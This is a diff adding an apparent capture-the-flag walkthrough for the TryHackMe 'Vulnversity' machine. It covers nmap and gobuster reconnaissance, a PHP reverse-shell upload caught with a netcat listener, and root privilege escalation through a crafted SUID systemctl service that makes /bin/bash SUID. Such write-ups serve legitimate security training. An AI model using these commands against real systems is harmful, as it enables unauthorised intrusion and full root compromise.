@@ -1,0 +1,74 @@
+----------------                               ------------------
+               :::::::::::;| VULNUNIVERSITY |;::::::::::::
+
+1) FIRST CONNECT TO THM VPN AND DEPLOY THE MACHINE.
+
+TASK - 1 (RECON)
+
+1. SCAN THE MACHINE.
+
+    nmap -Pn <IP>
+    nmap -A -T5 <IP> -vv
+
+"Found ports: 21/FTP, 22/SSH, 80/HTTP, 1234/CUSTOM?"
+
+2. FIND HIDDEN DIRS.
+
+    gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
+
+"FOUND /internal/ - UPLOAD PAGE!"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. UPLOAD SHELL.
+
+    Rename php-reverse-shell.php to shell.php5
+    Upload to /internal/
+
+2. GET SHELL.
+
+    nc -lvnp 4444
+    Access http://<IP>/internal/uploads/shell.php5
+
+"BOOM! SHELL AS www-data."
+
+----------TASK 2 COMPLETED-----------
+
+TASK - 3 (PRIV ESC - GOTTA GO ROOT!)
+
+1. FIND SUID BINARIES.
+
+    find / -perm -4000 2>/dev/null
+
+"FOUND /bin/systemctl (SUID ROOT!)"
+
+2. WHY THIS WORKS?
+
+    "systemctl controls services. SUID means it runs as root!
+     We can make it run OUR commands as root!"
+
+3. EXPLOIT:
+
+    TF=$(mktemp).service
+    echo '[Service]
+    ExecStart=/bin/sh -c "chmod +s /bin/bash"
+    [Install]
+    WantedBy=multi-user.target' > $TF
+
+    /bin/systemctl link $TF
+    /bin/systemctl enable --now $TF
+
+4. GET ROOT:
+
+    /bin/bash -p
+    whoami  # root!
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/bill/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- VULNUNIVERSITY OWNED ----------
